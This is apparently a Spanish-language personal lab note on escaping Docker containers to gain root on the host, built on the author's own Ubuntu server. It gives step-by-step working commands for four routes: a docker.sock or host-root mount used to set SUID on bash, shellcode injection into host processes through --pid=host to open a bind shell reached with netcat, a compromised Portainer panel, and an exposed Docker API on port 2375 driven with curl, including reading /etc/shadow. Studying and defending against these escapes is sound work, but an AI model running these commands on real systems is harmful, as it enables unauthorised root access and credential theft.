Se puede explotar debido a la mala configuracion del contenedor.
No solo logras elevar privilegios de administrador dentro del contenedor sino puedes escapar de el para acceder con privilegios a la maquina host
-----------------
Nos descargamos ISO de Ubuntu Server 
Configuramos y esperamos la instalacion

Para verificar que este todo configurado correctamente vamos a hace un escaneo ARP para poder detectar la ip del server


Una vez detectado nos metemos por ssh al servidor 

NOTA:
	LOS SERVIDORES UBUNTU POR DEFECTO TE METEN AL GRUPO LXD LO QUE SUPONE UNA GRAN FALLA YA QUE SE PUEDE ESCALAR PRIVILEGIOS SUID

Asi que desasignamos de la siguiente manera
	gpasswd -d ken lxd

Instalamos docker
	apt install docker.io
	
Cuando hacemos docker ps
	ejecuta por detras el daemon de docker que ejecuta la ruta /var/run/docker.sock
De forma que cuando el demonio de docker esta activo puedes hacer docker ps y te aparecera 

---------------------------
Instalemos un contenedor de docker
	`docker pull ubuntu:latest`

Corremos instancia docker con una montura
	`docker run --rm -dit -v /var/run/docker.sock:/var/run/docker.sock --name ubuntuServer ubuntu`
Nos metemos al contenedof
	`docker -it ubuntuServer bash`
Actualizamos e instalamos docker.io
	apt update && apt install docker.io

Gracias a la montura que se realizo si hacemos docker images somos capaces de ver las imagenes del host


RECORDEMOS 
	Creamos servidor
		Creamos maquina docker con monturas y nos metimos
			dentro del contenedor de docker volveremos a crear otro contenedor


Crearemos contenedor docker  pero con una montura diferente:
	docker run --rm -dit -v /:/mnt/root --name privesc ubuntu
			esta montura hace alusion a la raiz de la maquina host
Nos metemos al nuevo sub-contenedor
	docker exec -it privesc bash

Nos metemos a la ruta 
	/mnt/root/bin/

Damos privilegios suid a bash
	chmod u+s bash

Ahora podemos observar desde otra terminal como se dio privilegios suid a pesar de que estamos en 2 subcontenedores gracias a las monturas estando como usuario no privilegiado

Con otra terminal conectados por ssh al servidor podemos ver que se asignaron privilegios suid a la bash

Entonces solo hacemos bash -p y POWNED

(YA LO RESTANTE ES A IMAGINACION)

-----------------------------------------
----------------------
***FORMA 2**

a la hora de desplegar un contenedor lo que se puede hacer es en vez de meter -v y la montura se mete el comando `--pid=host`

docker run --rm -dit --pid=host --name ubuntuServer ubuntu

Al desplegar ese contenedor todos los proceso que tenemos activos en la maquina host podemos comunicarnos a ellos



Nos metemos al contenedo `docker exec -it ubuntuServer bash`
	ejecutamos el comando `ps -faux`
	podemos ver los servicios que esten corriendo
	![[Pasted image 20250425221837.png]]

Gracias a eso nosotros podemos ejecutar shellcode pero para 32bits   -- EN ESTE CASO TENEMOS 64 BITS POR LOO TANTO MODIFICAREMOS EL SHELLCODE 
			buscamos en el navegador: injecting shellcoode in running process linux
			Web: https://www.0x00sec.org/t/linux-infecting-running-processes/1097
			github para herramienta: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c

Intstalamos:
	apt install gcc netcat

Bucamos en el navegador 
	linux x64 bind shell shellcode exploit db : https://www.exploit-db.com/exploits/41128



Tenemos que asignarle una capabilitie al contenedor 
	apt install libcap2-bin
			ejecutamos
				capsh --print  | grep "sys_ptrace"
					Aparecera que tenemos desactivada la capabilitie
					![[Pasted image 20250425223730.png]]
	Para activarla tenemos que borrar el contenedor y modificarlo a 
			docker run --rm  -dit --pid=host --privileged --name ubuntuServer ubuntu

Nos copiamos el codigo de infect.c de la herramienta GitHub
Nos vamos al directior /tmp/ creamos y pegamos el infect.c (codigo) y modificamos el shellcode size a 87 y cambiamos el shellcode que se encuentra en exploit-db

Tenemos que compilarlo y pasarle el pid del proceso que se esta ejecutando y pwned

gcc inject.c -o inject
	./inject (PID)

![[Pasted image 20250425230323.png]]
Acaba de abrir el puerto 5600 en la maquina host
Entonces hacemos un nc a la maquina host que seria 172.17.0.1
		nc 172.17.0.1 5600
				Obtuvimos shell root
		Solo realizamos tratamiento TTI y CONSEGUIMOS ACCESO TOTAL


***CASO 3***

PORTAINER:
	Portainer es una **herramienta web open-source que permite gestionar contenedores Docker**

El panel de loging de portainer se puede vulnerar de distintas maneras por ataque de fuerza bruta(ya sea hydra, script python etc.)

Ejecutamos el siguiente comando:
	docker run -dit -p 8000:8000 -p 9000:9000 --name portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v /docker/portainer/data:/data portainer/portainer-ce
Nos metemos en el navegador con la ip de la maquina victima en el puerto 9000
	Podemos observar que nos mete a portainer.io
		Creamos usuario admin y su contraseña y nos metemos
![[Pasted image 20250425232245.png]]

Podemos observar que tenemos 1 contenedor activo
La informacion que nos muestra al darle click al container
	![[Pasted image 20250425232345.png]]
Esto esta relacionado cuando hacemos `docker images`

***EL PUNTO DE ESTO ES QUE SI AL ENUMERAR ENCONTRAMOS UN PORTAINER Y LO VULNERAMOS PODEMOS VER LAS IMAGENES Y AGREGAR CONTAINER
	IMAGEN: UBUNTU:LATESTE
	NAME: PRIVESC
	ACTIVAMOS LA OPCION DE INTERCATIVE & TTY
	DAMOS CLICK A MAP ADDITIONAL VOLUME : /MNT/ROOT
	HOST: /
	DEPLOY CONTAINER
	Nos metemos al container
		![[Pasted image 20250425233112.png]]
	Le damos click a Console y que ejecute una /bin/bash
		Connect y se despliega una consola interactiva
		
	EJECUTAMOS LOS SIGUIENTES COMANDOS:

![[Pasted image 20250425233328.png]]

**** POR ULTIMO DESDE SSH EN LA MAQUINA VICTIMA SOLO EJECUTAMOS UNA bash -p y POWNED!!!



------------------
--------------

***CASO 4***
Abusando de la API de docker
Opera por el puerto:
	HTTP -> 2375
	HTTPS -> 2376

No suelen estar activos para activarlos nos metemos a:
	https://gist.github.com/styblope/dc55e0ad2a9848f2cc3307d4819d819f
Seguimos las instrucciones para habilitarlo

Una vez hecho los pasos haremos
	netstat -nat
		Confirmamos que el puerto 2375 este activo
		

Ejecutamos
	docker pull ubuntu:latest
	docker run --rm -dit --name ubuntuServer ubuntu
	docker exec -it ubuntuServer bash
		apt update
		apt install curl jq

dentro del contenedor hacemos:
ps -faux
No existe el recurso  /var/run/docker.sock
echo '' > /dev/tcp/172.17.0.1/2375
echo $?

Entonces nos vamos a HackTricks 2375 pentesting docker
	Buscamos el comando por curl que te genera otro contenedor
		 curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/create?name=test -d '{"Image":"ubuntu:latest", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
	![[Pasted image 20250425235854.png]]
	Nos respondera con un identificador
f1fc823f67c6b1a0cbc647f1456bbe203960e661dfe782c48d4c6a2d88a8ea8b

Para listar los contenedores podemos hacer lo siguiente:
	`curl http://172.17.0.1:2375/containers/json | jq`
	
Para listar las imagenes:
`curl http://172.17.0.1:2375/images/json | jq`


Haciendo la enumeracion ya podemos saber que esta ubuntu:latest

Hacemos el sig comando para ejecutar el contenedor:
url -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/f1fc823f67c6b1a0cbc647f1456bbe203960e661dfe782c48d4c6a2d88a8ea8b/start?name=test

***SE HA CREADO EL CONTENEDOR

Ahora con esto realizamos lo siguiente para darle permisos suid a mnt/bin/bash;
	curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/f1fc823f67c6b1a0cbc647f1456bbe203960e661dfe782c48d4c6a2d88a8ea8b/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "chmod u+s /mnt/bin/bash"]}'
{"Id":"c001c5c1bf7b2d08d23e2d1a06fd26b225e55d6f62495c2de8eb0b7a575b6d6f"}


Ahora  ejecutaremos el comando (adjuntamos el id del contenedor que se creo en el comando anterior):
curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/exec/c001c5c1bf7b2d08d23e2d1a06fd26b225e55d6f62495c2de8eb0b7a575b6d6f/start -d '{}'

NOTA: SI QUISIERAMOS VER EL OUTPUT DE CADA VEZ QUE HACEMOS EL CURL AGREGAMOS --output - (Para poder leer archivos como el /etc/shadow)

****LISTO AHORA SOLO HACEMOS "bash -p" DESDE USUARIO NO PRIVILEGIADO Y PWNED!! HEMOS ACCEDIDO COMO ROOT****



	



	